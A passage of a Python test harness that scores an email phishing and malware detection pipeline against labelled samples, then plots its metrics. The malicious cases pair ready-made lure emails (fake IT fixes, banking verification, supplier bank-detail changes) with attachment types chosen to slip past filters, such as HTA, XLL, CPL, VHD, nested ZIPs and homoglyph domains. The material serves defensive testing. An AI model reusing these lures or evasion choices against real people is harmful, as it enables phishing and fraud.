                "Please run the attached shortcut to apply the fix.\n\n"
                "IT Help Desk"
            ),
            attachments=[("VPN_Fix.lnk", _standalone_lnk(), "application/x-ms-shortcut")],
        ),
    })

    # --- 20. HTA application file ---
    cases.append({
        "name": "HTA_application",
        "description": "HTML Application with VBScript — runs with full privileges via mshta.exe",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="updates@system-maintenance.com",
            to_addr="test@test.com",
            subject="Critical Security Patch - Run Immediately",
            body=(
                "A critical security vulnerability has been identified.\n"
                "Please run the attached update to patch your system.\n\n"
                "System Administration"
            ),
            attachments=[("SecurityPatch_KB5034441.hta", _hta_application(),
                         "application/hta")],
        ),
    })

    # --- 21. Clean PDF with phishing URL only (no JS/Launch) ---
    cases.append({
        "name": "PDF_phishing_url_only",
        "description": "PDF with /URI phishing link — no /JS, /OpenAction, or /Launch",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="notifications@banking-alerts-service.com",
            to_addr="test@test.com",
            subject="Important: Review Your Recent Transaction",
            body=(
                "Dear customer,\n\n"
                "A transaction on your account requires verification.\n"
                "Please review the attached document for details.\n\n"
                "Transaction Alerts"
            ),
            attachments=[("Transaction_Review.pdf", _pdf_with_phishing_url_only(),
                         "application/pdf")],
        ),
    })

    # --- 22. XLL Excel add-in (PE/DLL not in blocked extensions) ---
    cases.append({
        "name": "XLL_excel_addin",
        "description": "Excel XLL add-in — DLL with xlAutoOpen, .xll not in BLOCKED_EXTENSIONS",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="analytics@business-tools-pro.com",
            to_addr="test@test.com",
            subject="Excel Analytics Plugin - Free Trial",
            body=(
                "Hi,\n\n"
                "Thank you for your interest in our analytics plugin.\n"
                "Install the attached Excel add-in to get started.\n\n"
                "Business Tools Pro"
            ),
            attachments=[("AnalyticsPlugin.xll", _xll_excel_addin(),
                         "application/vnd.ms-excel")],
        ),
    })

    # --- 23. MHTML web archive with credential harvester ---
    cases.append({
        "name": "MHTML_credential_harvester",
        "description": "MHTML web archive with embedded login form + data exfiltration",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="webmail@attijari-portal-service.com",
            to_addr="test@test.com",
            subject="Your Webmail Session Has Expired",
            body=(
                "Your webmail session has expired.\n"
                "Open the attached file to re-authenticate.\n\n"
                "Webmail Service"
            ),
            attachments=[("reauth_session.mhtml", _mhtml_web_archive(),
                         "message/rfc822")],
        ),
    })

    # --- 24. Obfuscated VBA macro in .xlsm ---
    cases.append({
        "name": "xlsm_obfuscated_macro",
        "description": "Excel .xlsm with Chr()-obfuscated VBA — tests oletools deobfuscation",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="finance@quarterly-reports-portal.com",
            to_addr="test@test.com",
            subject="Q2 Budget Tracker - Enable Macros for Interactive Charts",
            body=(
                "Hi,\n\n"
                "The Q2 budget tracker is attached. Please enable macros\n"
                "to activate the interactive charts and pivot tables.\n\n"
                "Finance Department"
            ),
            attachments=[("Q2_Budget_Tracker.xlsm", _xlsm_obfuscated_macro(),
                         "application/vnd.ms-excel.sheet.macroEnabled.12")],
        ),
    })

    # --- 25. ICS calendar invite with phishing link ---
    cases.append({
        "name": "ICS_calendar_phishing",
        "description": "Calendar invite with phishing URL — auto-adds to calendar apps",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="calendar@meeting-scheduler-pro.com",
            to_addr="test@test.com",
            subject="Meeting Invite: Mandatory Security Verification",
            body=(
                "You have a new calendar invite.\n"
                "Please accept the attached meeting request.\n\n"
                "Meeting Scheduler"
            ),
            attachments=[("security_verification.ics", _ics_calendar_phishing(),
                         "text/calendar")],
        ),
    })

    # --- 26. Spoofed reply chain (BEC with fake conversation) ---
    cases.append({
        "name": "spoofed_reply_chain",
        "description": "Fake forwarded conversation with wire transfer request — auth passes",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="s.dumont@supplier-legit.com",
            to_addr="test@test.com",
            subject="Re: FW: Supplier Payment - Q2 — Updated Banking Details",
            body=_spoofed_reply_chain_body(),
            extra_headers={
                "In-Reply-To": "<fake-thread-id-8472@supplier-legit.com>",
                "References": "<original-thread@attijaribank.com.tn> <fake-thread-id-8472@supplier-legit.com>",
            },
            auth_pass=True,  # legitimate sending server
        ),
    })

    # --- 27. Zero-width Unicode obfuscation ---
    cases.append({
        "name": "zero_width_unicode_evasion",
        "description": "Phishing body with zero-width chars breaking keyword detection",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="security-alert@account-protection-center.com",
            to_addr="test@test.com",
            subject="Account Security Alert",
            body=_zero_width_obfuscated_body(),
            auth_pass=False,
        ),
    })

    # --- 28. Homoglyph domain (Cyrillic lookalikes) ---
    cases.append({
        "name": "homoglyph_domain_phishing",
        "description": "Email body with Cyrillic homoglyphs in domain — visually identical to real domain",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="service-client@attijari-support.com",
            to_addr="test@test.com",
            subject="Votre acces bancaire - Verification requise",
            body=_homoglyph_domain_body(),
            auth_pass=False,
        ),
    })

    # --- 29. CHM help file with ActiveX ---
    cases.append({
        "name": "CHM_help_file_exploit",
        "description": "Compiled HTML Help with ActiveX object executing PowerShell",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="documentation@product-guides.com",
            to_addr="test@test.com",
            subject="Updated Product Documentation",
            body=(
                "Hi,\n\n"
                "The latest product documentation is attached.\n"
                "Double-click to open in Windows Help viewer.\n\n"
                "Documentation Team"
            ),
            attachments=[("Product_Guide_2024.chm", _chm_help_file(),
                         "application/x-chm")],
        ),
    })

    # --- 30. PPSX auto-play PowerPoint with OLE ---
    cases.append({
        "name": "PPSX_autoplay_OLE",
        "description": "PowerPoint Show with embedded OLE launching cmd.exe — auto-plays",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="presentations@corporate-events.com",
            to_addr="test@test.com",
            subject="Board Presentation - Q3 Strategy Preview",
            body=(
                "Hi,\n\n"
                "Attached is the board presentation for the Q3 strategy review.\n"
                "It will auto-play when opened.\n\n"
                "Corporate Events"
            ),
            attachments=[("Q3_Strategy_Preview.ppsx", _ppsx_autoplay(),
                         "application/vnd.openxmlformats-officedocument.presentationml.slideshow")],
        ),
    })

    # --- 31. Nested ZIP (payload 3 levels deep) ---
    cases.append({
        "name": "nested_zip_evasion",
        "description": "ZIP→ZIP→ZIP with PE payload 3 levels deep — evades single-layer extraction",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="archive@secure-file-transfer.com",
            to_addr="test@test.com",
            subject="Encrypted Documents - Handle With Care",
            body=(
                "Hi,\n\n"
                "The requested documents have been packaged for secure transfer.\n"
                "Extract all layers to access the files.\n\n"
                "Secure File Transfer"
            ),
            attachments=[("Secure_Documents.zip", _nested_zip_payload(), "application/zip")],
        ),
    })

    # --- 32. VHD virtual disk with embedded PE ---
    cases.append({
        "name": "VHD_virtual_disk_payload",
        "description": "VHD image auto-mounts on Win10+ — contains PE, bypasses MOTW",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="it-deployment@system-images.com",
            to_addr="test@test.com",
            subject="Deployment Image - New Workstation Setup",
            body=(
                "Hi,\n\n"
                "Attached is the deployment image for the new workstation.\n"
                "Double-click to mount and run setup.\n\n"
                "IT Deployment"
            ),
            attachments=[("Workstation_Setup.vhd", _vhd_virtual_disk(),
                         "application/x-vhd")],
        ),
    })

    # --- 33. Base64 PowerShell in .txt (social engineering) ---
    cases.append({
        "name": "base64_powershell_txt",
        "description": "Plain .txt with PowerShell dropper instructions — tests YARA on text files",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="support@vpn-helpdesk.com",
            to_addr="test@test.com",
            subject="VPN Fix Instructions - Follow Steps Carefully",
            body=(
                "Hi,\n\n"
                "We've identified the VPN connectivity issue on your machine.\n"
                "Please follow the instructions in the attached text file.\n\n"
                "IT Support - Ext 4521"
            ),
            attachments=[("VPN_Fix_Instructions.txt", _base64_powershell_txt(),
                         "text/plain")],
        ),
    })

    # --- 34. WSF Windows Script File ---
    cases.append({
        "name": "WSF_script_dropper",
        "description": "Windows Script File (.wsf) — not in BLOCKED_EXTENSIONS, runs via wscript",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="automation@workflow-tools.com",
            to_addr="test@test.com",
            subject="Automated Report Generator - Quick Setup",
            body=(
                "Hi,\n\n"
                "Run the attached script to set up automated report generation.\n"
                "It will configure your environment in seconds.\n\n"
                "Workflow Tools"
            ),
            attachments=[("ReportSetup.wsf", _wsf_script(), "application/xml")],
        ),
    })

    # --- 35. CPL control panel file (renamed DLL) ---
    cases.append({
        "name": "CPL_control_panel",
        "description": "Control Panel .cpl file — DLL executed via control.exe, not in blocked extensions",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="admin@display-settings-update.com",
            to_addr="test@test.com",
            subject="Display Calibration Tool",
            body=(
                "Hi,\n\n"
                "Attached is the display calibration tool requested by IT.\n"
                "Double-click to open in Control Panel.\n\n"
                "IT Admin"
            ),
            attachments=[("DisplayCalibration.cpl", _cpl_control_panel(),
                         "application/cpl")],
        ),
    })

    # --- 36. PDF with /Launch + embedded file (no JS) ---
    cases.append({
        "name": "PDF_launch_embedded_exe",
        "description": "PDF with /Launch action + /EmbeddedFile — runs executable, no JavaScript",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="compliance@audit-reports-service.com",
            to_addr="test@test.com",
            subject="Compliance Audit Report - Immediate Review Required",
            body=(
                "Dear compliance officer,\n\n"
                "The annual compliance audit report is attached.\n"
                "Please review and acknowledge by end of week.\n\n"
                "Audit Services"
            ),
            attachments=[("Compliance_Audit_2024.pdf", _pdf_embedded_file_launch(),
                         "application/pdf")],
        ),
    })

    # --- 37. Thread hijack — pure social engineering ---
    cases.append({
        "name": "thread_hijack_BEC",
        "description": "Fake reply chain referencing real colleagues — auth passes, no payload",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="marie.finance@trusted-partner.fr",
            to_addr="test@test.com",
            subject="Re: Re: FW: Changement coordonnees bancaires fournisseur",
            body=_email_thread_hijack_body(),
            extra_headers={
                "In-Reply-To": "<genuine-looking-id@attijaribank.com.tn>",
                "References": "<thread-start@attijaribank.com.tn> <reply1@attijaribank.com.tn>",
            },
            auth_pass=True,  # sender's server is legit
        ),
    })

    # --- 38. Polyglot PDF + PE executable ---
    cases.append({
        "name": "polyglot_PDF_PE",
        "description": "File valid as both PDF and PE — starts with %PDF but contains MZ at offset",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="research@academic-papers.org",
            to_addr="test@test.com",
            subject="Published Paper: Advanced Threat Detection Methods",
            body=(
                "Dear colleague,\n\n"
                "Your published paper is attached for your records.\n\n"
                "Editorial Office"
            ),
            attachments=[("published_paper_2024.pdf", _polyglot_pdf_exe(),
                         "application/pdf")],
        ),
    })

    # --- 39. Polyglot OLE + PDF + PE ---
    cases.append({
        "name": "polyglot_OLE_PDF_PE",
        "description": "OLE document with embedded PDF content and PE stub — triple polyglot",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="contracts@legal-documents.com",
            to_addr="test@test.com",
            subject="Service Agreement - Final Version",
            body=(
                "Hi,\n\n"
                "Attached is the final service agreement.\n"
                "Please review and sign.\n\n"
                "Legal Department"
            ),
            attachments=[("Service_Agreement_Final.doc", _polyglot_pdf_ole(),
                         "application/msword")],
        ),
    })

    return cases


def build_benign_cases() -> list[dict]:
    """Generate clean/legitimate test cases."""
    cases = []

    # --- 1. Normal invoice with PDF ---
    cases.append({
        "name": "legitimate_invoice",
        "description": "Normal business invoice with clean PDF",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="billing@cloudprovider.com",
            to_addr="test@test.com",
            subject="Invoice #CP-2024-1234 for June Services",
            body=(
                "Dear customer,\n\n"
                "Please find attached your invoice for June 2024 cloud services.\n"
                "Total: $127.50\nDue date: July 15, 2024\n\n"
                "Thank you for your business.\nCloud Provider Billing"
            ),
            attachments=[("invoice_CP-2024-1234.pdf",
                         b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\n"
                         b"endobj\n2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\n"
                         b"endobj\nxref\n0 3\ntrailer\n<< /Size 3 /Root 1 0 R >>\n"
                         b"startxref\n0\n%%EOF\n",
                         "application/pdf")],
        ),
    })

    # --- 2. LinkedIn notification ---
    cases.append({
        "name": "linkedin_notification",
        "description": "Standard LinkedIn profile view notification",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="messages-noreply@linkedin.com",
            to_addr="test@test.com",
            subject="Mohamed, you appeared in 42 searches this week",
            body=(
                "Your weekly search stats\n\n"
                "42 people found you in LinkedIn search.\n"
                "See who's looking at your profile:\n"
                "https://www.linkedin.com/me/search-appearances\n\n"
                "Unsubscribe: https://www.linkedin.com/comm/settings\n"
            ),
        ),
    })

    # --- 3. Marketing email with urgency (legitimate) ---
    cases.append({
        "name": "marketing_promo",
        "description": "NordPass promotional offer with time pressure — legitimate",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="no-reply@mail.nordpass.com",
            to_addr="test@test.com",
            subject="Last chance: Premium for $0.99/month — offer expires in 48 hours",
            body=(
                "Upgrade to NordPass Premium\n\n"
                "Limited time offer: Get premium password management for $0.99/month.\n"
                "Offer expires in 48 hours — don't miss out!\n\n"
                "https://nordpass.com/upgrade\n\n"
                "Unsubscribe: https://nordpass.com/unsubscribe\n"
            ),
        ),
    })

    # --- 4. GitHub notification ---
    cases.append({
        "name": "github_notification",
        "description": "GitHub PR review request",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="notifications@github.com",
            to_addr="test@test.com",
            subject="[project/repo] Fix: resolve CORS issue (#234)",
            body=(
                "alice requested your review on this pull request.\n\n"
                "Fix: resolve CORS issue by updating allowed origins\n"
                "https://github.com/project/repo/pull/234\n\n"
                "+12 -3 files changed\n"
            ),
        ),
    })

    # --- 5. Conference registration ---
    cases.append({
        "name": "conference_registration",
        "description": "IEEE conference registration confirmation",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="registration@ieee-conference.org",
            to_addr="test@test.com",
            subject="Registration Confirmed: IEEE ICSE 2024",
            body=(
                "Dear Mohamed,\n\n"
                "Your registration for IEEE ICSE 2024 has been confirmed.\n"
                "Registration deadline for early bird pricing: July 1, 2024.\n\n"
                "Please review the attached schedule.\n"
                "https://conf.ieee.org/icse2024/schedule\n\n"
                "IEEE Conference Services"
            ),
        ),
    })

    # --- 6. Internal team email with document ---
    cases.append({
        "name": "internal_team_doc",
        "description": "Colleague sharing a meeting document — normal business",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="marie.dupont@fournisseur-connu.fr",
            to_addr="test@test.com",
            subject="Re: Compte rendu reunion du 12 mars",
            body=(
                "Bonjour,\n\n"
                "Veuillez trouver ci-joint le compte rendu de notre reunion.\n"
                "Cordialement,\nMarie Dupont"
            ),
            attachments=[("CR_reunion_12mars.pdf",
                         b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\n"
                         b"endobj\n2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\n"
                         b"endobj\nxref\n0 3\ntrailer\n<< /Size 3 /Root 1 0 R >>\n"
                         b"startxref\n0\n%%EOF\n",
                         "application/pdf")],
        ),
    })

    # --- 7. Delivery notification ---
    cases.append({
        "name": "delivery_notification",
        "description": "FedEx package tracking update",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="tracking@fedex.com",
            to_addr="test@test.com",
            subject="Your package is out for delivery",
            body=(
                "FedEx Delivery Update\n\n"
                "Your package (tracking: 7892 3456 1234) is out for delivery today.\n"
                "Estimated delivery: 2:00 PM - 6:00 PM\n\n"
                "Track your package: https://www.fedex.com/track?id=789234561234\n"
            ),
        ),
    })

    # --- 8. Newsletter with multiple links (legitimate) ---
    cases.append({
        "name": "newsletter_multilink",
        "description": "DataCamp weekly newsletter with many URLs — normal",
        "expected": "benign",
        "eml": _make_eml(
            from_addr="newsletter@datacamp.com",
            to_addr="test@test.com",
            subject="This Week in Data Science",
            body=(
                "This Week in Data Science\n\n"
                "Top articles:\n"
                "- Introduction to LLMs: https://www.datacamp.com/blog/llm-intro\n"
                "- Python Pandas Tips: https://www.datacamp.com/blog/pandas-tips\n"
                "- ML Interview Guide: https://www.datacamp.com/blog/ml-interview\n\n"
                "Unsubscribe: https://www.datacamp.com/unsubscribe\n"
            ),
        ),
    })

    return cases


# ======================== PIPELINE RUNNER (NO DB) ========================

def run_pipeline_isolated(raw_eml: bytes, run_llm: bool = True) -> dict:
    """Run the full analysis pipeline on a raw email WITHOUT any DB writes.

    Returns a dict with per-stage results and the final verdict.
    """
    result = {
        "stages": {},
        "final_status": "unknown",
        "flags_total": 0,
        "deterministic_escalation": False,
    }

    # --- Parse ---
    ingestion = EmailIngestion(host="", user="", password="")
    try:
        parsed = ingestion.parse_email(raw_eml)
    except Exception as e:
        result["final_status"] = "escalated"
        result["stages"]["parse"] = {"error": str(e)}
        return result

    result["stages"]["parse"] = {
        "status": parsed.get("status"),
        "errors": parsed.get("parse_errors", []),
        "attachments": len(parsed.get("attachments", [])),
    }

    # --- Auth check (from headers, not live DKIM) ---
    auth_header = parsed.get("headers", {}).get("authentication-results") or ""
    auth_failed = any(x in auth_header.lower() for x in ["dkim=fail", "spf=fail", "dmarc=fail"])
    parsed["auth"] = {
        "summary": auth_header,
        "any_failure": auth_failed,
        "auth_header": {
            "spf": "fail" if "spf=fail" in auth_header.lower() else "pass" if "spf=pass" in auth_header.lower() else "none",
            "dkim": "fail" if "dkim=fail" in auth_header.lower() else "pass" if "dkim=pass" in auth_header.lower() else "none",
            "dmarc": "fail" if "dmarc=fail" in auth_header.lower() else "pass" if "dmarc=pass" in auth_header.lower() else "none",
        }
    }
    if auth_failed:
        parsed["status"] = "escalated"
        result["deterministic_escalation"] = True

    result["stages"]["auth"] = {"failed": auth_failed, "details": parsed["auth"]["auth_header"]}

    # --- Rules engine ---
    # Temporarily clear the blocklist cache so tests measure pure pipeline detection,
    # not accumulated analyst blocklist decisions from prior sessions.
    import rules as _rules_mod
    _saved_cache = _rules_mod._blocklist_cache
    _saved_time = _rules_mod._blocklist_cache_time
    _rules_mod._blocklist_cache = set()
    _rules_mod._blocklist_cache_time = time.time()  # prevent refresh

    engine = RuleEngine()
    pre_rules_status = parsed["status"]
    analysis = engine.analyze(parsed)

    # Restore blocklist cache
    _rules_mod._blocklist_cache = _saved_cache
    _rules_mod._blocklist_cache_time = _saved_time
    if pre_rules_status == "escalated" and analysis["verdict"] == "accepted":
        analysis["verdict"] = "escalated"
    parsed["status"] = analysis["verdict"]
    parsed["analysis"] = analysis

    rules_flags = [d for d in analysis["details"] if d["flagged"]]
    result["stages"]["rules"] = {
        "verdict": analysis["verdict"],
        "total_rules": analysis["rules_run"],
        "flags": len(rules_flags),
        "flagged_rules": [d["rule"] for d in rules_flags],
    }
    if rules_flags:
        result["deterministic_escalation"] = True

    # --- Extraction ---
    if parsed.get("attachments"):
        try:
            from extraction import extract_all_attachments
            ext_result = extract_all_attachments(parsed)
            parsed["extraction"] = ext_result

            ext_flags = ext_result.get("total_flags", 0)
            result["stages"]["extraction"] = {
                "total_flags": ext_flags,
                "escalate": ext_result.get("escalate", False),
                "results": [
                    {
                        "filename": r.get("filename"),
                        "type_mismatch": r.get("type_mismatch"),
                        "flags": r.get("flags", []),
                        "suspicious": r.get("suspicious"),
                    }
                    for r in ext_result.get("results", [])
                ],
            }
            if ext_result.get("escalate"):
                parsed["status"] = "escalated"
                result["deterministic_escalation"] = True
        except Exception as e:
            result["stages"]["extraction"] = {"error": str(e)}
    else:
        result["stages"]["extraction"] = {"skipped": True}

    # --- LLM analysis (optional) ---
    if run_llm and parsed["status"] != "escalated":
        try:
            enrichment_data = {
                "auth": parsed.get("auth", {}),
            }
            if parsed.get("extraction", {}).get("results"):
                enrichment_data["extraction"] = [
                    {"filename": r.get("filename"), "flags": r.get("flags", []),
                     "type_mismatch": r.get("type_mismatch"), "iocs": r.get("iocs", {})}
                    for r in parsed["extraction"]["results"]
                ]
            context = {
                "headers": parsed.get("headers", {}),
                "attachments": parsed.get("attachments", []),
                "enrichment": enrichment_data,
            }
            llm_res = analyze_email_body(parsed.get("body_text", ""), context=context)
            llm_verdict = (llm_res.get("verdict") or "").lower().strip()
            if llm_verdict in ("accepter", "accepted", "accept", "clean", "safe"):
                llm_verdict = "accepted"
            elif llm_verdict in ("rejeter", "escalader", "escalated", "reject"):
                llm_verdict = "escalated"
            else:
                llm_verdict = "escalated"

            if parsed["status"] != "escalated" and llm_verdict == "escalated":
                parsed["status"] = "escalated"

            result["stages"]["llm"] = {
                "verdict": llm_verdict,
                "confidence": llm_res.get("confidence"),
                "risk_score": llm_res.get("risk_score"),
                "reasons": llm_res.get("reasons", []),
            }
        except Exception as e:
            parsed["status"] = "escalated"
            result["stages"]["llm"] = {"error": str(e), "verdict": "escalated"}
    elif run_llm:
        result["stages"]["llm"] = {"skipped": "already_escalated", "verdict": "escalated"}
    else:
        result["stages"]["llm"] = {"skipped": "llm_disabled"}

    result["final_status"] = parsed["status"]
    result["flags_total"] = sum(
        1 for stage in result["stages"].values()
        if isinstance(stage, dict) and stage.get("flags")
    )

    return result


# ======================== LIVE EMAIL LOADER ========================

def load_live_emails(limit: int = 15) -> list[dict]:
    """Fetch recent emails from IMAP as benign test cases."""
    cases = []
    try:
        ingestion = EmailIngestion(
            host=os.getenv("IMAP_HOST"),
            user=os.getenv("IMAP_USER"),
            password=os.getenv("IMAP_PASSWORD"),
        )
        ingestion.connect()
        raw_emails = ingestion.fetch_recent(since_days=7, limit=limit)
        ingestion.disconnect()

        for i, raw in enumerate(raw_emails):
            msg = BytesParser(policy=policy.default).parsebytes(raw)
            sender = msg.get("From", "unknown")
            subject = msg.get("Subject", "no subject")
            cases.append({
                "name": f"live_email_{i+1}",
                "description": f"Live inbox: {sender[:40]} — {subject[:50]}",
                "expected": "benign",
                "eml": raw,
            })
    except Exception as e:
        print(f"[LIVE] Failed to fetch live emails: {e}")
    return cases


# ======================== METRICS & VISUALIZATION ========================

def classify_result(result: dict) -> str:
    """Map pipeline result to binary classification."""
    status = result.get("final_status", "")
    if status in ("escalated", "quarantined", "blocked", "proposed_reject"):
        return "malicious"
    elif status in ("accepted", "recu"):
        return "benign"
    return "malicious"  # fail-safe: unknown = treat as malicious


def compute_metrics(y_true: list[str], y_pred: list[str]) -> dict:
    """Compute all classification metrics."""
    labels = ["benign", "malicious"]
    return {
        "accuracy": accuracy_score(y_true, y_pred),
        "precision": precision_score(y_true, y_pred, pos_label="malicious", zero_division=0),
        "recall": recall_score(y_true, y_pred, pos_label="malicious", zero_division=0),
        "f1": f1_score(y_true, y_pred, pos_label="malicious", zero_division=0),
        "confusion_matrix": confusion_matrix(y_true, y_pred, labels=labels).tolist(),
        "classification_report": classification_report(y_true, y_pred, labels=labels, zero_division=0),
    }


def plot_confusion_matrix(cm: list, output_path: Path):
    """Heatmap of the confusion matrix."""
    fig, ax = plt.subplots(figsize=(7, 6))
    labels = ["Benign", "Malicious"]
    cm_arr = np.array(cm)
    sns.heatmap(
        cm_arr, annot=True, fmt="d", cmap="RdYlGn_r",
        xticklabels=labels, yticklabels=labels,
        linewidths=1, linecolor="#333",
        annot_kws={"fontsize": 18, "fontweight": "bold"},
        ax=ax,
    )
    ax.set_xlabel("Predicted", fontsize=13, fontweight="bold")
    ax.set_ylabel("Actual", fontsize=13, fontweight="bold")
    ax.set_title("Pipeline Confusion Matrix", fontsize=15, fontweight="bold", pad=12)

    # Annotate quadrants
    total = cm_arr.sum()
    annotations = [
        (0, 0, "TN", "#2ecc71"), (0, 1, "FP", "#e67e22"),
        (1, 0, "FN", "#e74c3c"), (1, 1, "TP", "#2ecc71"),
    ]
    for row, col, label, color in annotations:
        pct = cm_arr[row, col] / total * 100 if total else 0
        ax.text(col + 0.5, row + 0.78, f"{label} ({pct:.0f}%)",
                ha="center", va="center", fontsize=10, color=color, fontweight="bold")

    plt.tight_layout()
    fig.savefig(output_path, dpi=150, bbox_inches="tight")
    plt.close(fig)
    print(f"  [PLOT] Confusion matrix -> {output_path}")


def plot_metrics_bar(metrics: dict, output_path: Path):
    """Bar chart of precision, recall, F1, accuracy."""
    fig, ax = plt.subplots(figsize=(8, 5))
    names = ["Accuracy", "Precision\n(malicious)", "Recall\n(malicious)", "F1 Score"]
    values = [metrics["accuracy"], metrics["precision"], metrics["recall"], metrics["f1"]]
    colors = ["#3498db", "#e67e22", "#e74c3c", "#2ecc71"]

    bars = ax.bar(names, values, color=colors, width=0.6, edgecolor="#222", linewidth=1.2)
    for bar, val in zip(bars, values):
        ax.text(bar.get_x() + bar.get_width() / 2, bar.get_height() + 0.02,
                f"{val:.1%}", ha="center", va="bottom", fontsize=13, fontweight="bold")

    ax.set_ylim(0, 1.15)
    ax.set_ylabel("Score", fontsize=12)
    ax.set_title("Pipeline Detection Metrics", fontsize=15, fontweight="bold", pad=12)
    ax.axhline(y=1.0, color="#555", linestyle="--", linewidth=0.8, alpha=0.5)
    ax.spines["top"].set_visible(False)
    ax.spines["right"].set_visible(False)

    plt.tight_layout()
    fig.savefig(output_path, dpi=150, bbox_inches="tight")
    plt.close(fig)
    print(f"  [PLOT] Metrics bar chart -> {output_path}")


def plot_stage_detection(results: list[dict], output_path: Path):
    """Heatmap showing which stage caught each malicious email."""
    malicious = [r for r in results if r["case"]["expected"] == "malicious"]
    if not malicious:
        return

    stages = ["auth", "rules", "extraction", "llm"]
    names = [r["case"]["name"] for r in malicious]
    matrix = []

    for r in malicious:
        row = []
        s = r["result"]["stages"]
        # Auth
        row.append(1 if s.get("auth", {}).get("failed") else 0)
        # Rules
        row.append(1 if s.get("rules", {}).get("flags", 0) > 0 else 0)
        # Extraction
        ext = s.get("extraction", {})
        row.append(1 if ext.get("total_flags", 0) > 0 or ext.get("escalate") else 0)
        # LLM
        llm = s.get("llm", {})
        row.append(1 if llm.get("verdict") == "escalated" else 0)
        matrix.append(row)

    fig, ax = plt.subplots(figsize=(9, max(5, len(names) * 0.5 + 2)))
    mat = np.array(matrix)
    sns.heatmap(
        mat, annot=True, fmt="d", cmap="YlOrRd",
        xticklabels=[s.upper() for s in stages],
        yticklabels=[n.replace("_", " ") for n in names],
        linewidths=1, linecolor="#333",
        cbar_kws={"label": "Detected (1=yes)"},
        ax=ax,
    )
    ax.set_title("Detection Stage Heatmap (Malicious Emails)", fontsize=14, fontweight="bold", pad=12)
    ax.set_xlabel("Pipeline Stage", fontsize=11)
    ax.set_ylabel("Test Case", fontsize=11)

    plt.tight_layout()
    fig.savefig(output_path, dpi=150, bbox_inches="tight")
    plt.close(fig)
    print(f"  [PLOT] Stage detection heatmap -> {output_path}")


def plot_per_case_detail(results: list[dict], output_path: Path):
    """Horizontal bar chart showing per-case verdict with expected vs predicted."""
    fig, ax = plt.subplots(figsize=(12, max(5, len(results) * 0.4 + 2)))

    names = []
    colors = []
    for r in results:
        name = r["case"]["name"].replace("_", " ")
        expected = r["case"]["expected"]
        predicted = classify_result(r["result"])
        correct = expected == predicted

        names.append(name)
        if correct and expected == "malicious":
            colors.append("#e74c3c")   # TP — red (correctly caught)
        elif correct and expected == "benign":
            colors.append("#2ecc71")   # TN — green (correctly passed)
        elif not correct and expected == "malicious":
            colors.append("#f39c12")   # FN — orange (MISSED — worst case)
        else:
            colors.append("#e67e22")   # FP — amber (false alarm)

    y_pos = np.arange(len(names))
    bars = ax.barh(y_pos, [1] * len(names), color=colors, edgecolor="#222", linewidth=0.8)
    ax.set_yticks(y_pos)
    ax.set_yticklabels(names, fontsize=9)
    ax.set_xlim(0, 1.5)
    ax.set_xticks([])

    for i, r in enumerate(results):
        expected = r["case"]["expected"]
        predicted = classify_result(r["result"])
        status = r["result"]["final_status"]
        label = f"Expected: {expected} | Got: {predicted} ({status})"
        match = "OK" if expected == predicted else "MISS" if expected == "malicious" else "FP"
        ax.text(1.02, i, f"[{match}] {label}", va="center", fontsize=8.5, fontfamily="monospace")

    # Legend
    from matplotlib.patches import Patch
    legend_items = [
        Patch(facecolor="#e74c3c", label="TP (malicious caught)"),
        Patch(facecolor="#2ecc71", label="TN (benign passed)"),
        Patch(facecolor="#f39c12", label="FN (malicious MISSED)"),
        Patch(facecolor="#e67e22", label="FP (benign flagged)"),
    ]
    ax.legend(handles=legend_items, loc="lower right", fontsize=9)

    ax.set_title("Per-Case Verdict Results", fontsize=14, fontweight="bold", pad=12)
    ax.invert_yaxis()
    ax.spines["top"].set_visible(False)
    ax.spines["right"].set_visible(False)
    ax.spines["bottom"].set_visible(False)

    plt.tight_layout()
    fig.savefig(output_path, dpi=150, bbox_inches="tight")
    plt.close(fig)
    print(f"  [PLOT] Per-case detail chart -> {output_path}")


def plot_radar(metrics: dict, output_path: Path):
    """Radar / spider chart of multi-dimensional pipeline performance."""
    from matplotlib.patches import FancyBboxPatch

    labels = ["Accuracy", "Precision", "Recall", "F1", "Specificity"]
    cm = np.array(metrics["confusion_matrix"])
    tn, fp, fn, tp = cm[0][0], cm[0][1], cm[1][0], cm[1][1]
    specificity = tn / (tn + fp) if (tn + fp) > 0 else 0
    values = [metrics["accuracy"], metrics["precision"], metrics["recall"], metrics["f1"], specificity]

    angles = np.linspace(0, 2 * np.pi, len(labels), endpoint=False).tolist()
    values_plot = values + [values[0]]
    angles += [angles[0]]

    fig, ax = plt.subplots(figsize=(7, 7), subplot_kw=dict(polar=True))
    ax.fill(angles, values_plot, color="#6366f1", alpha=0.20)
    ax.plot(angles, values_plot, color="#6366f1", linewidth=2.5, marker="o", markersize=8)

    # Value labels on each vertex
    for angle, val, label in zip(angles[:-1], values, labels):
        ha = "left" if 0 < angle < np.pi else "right" if np.pi < angle < 2 * np.pi else "center"
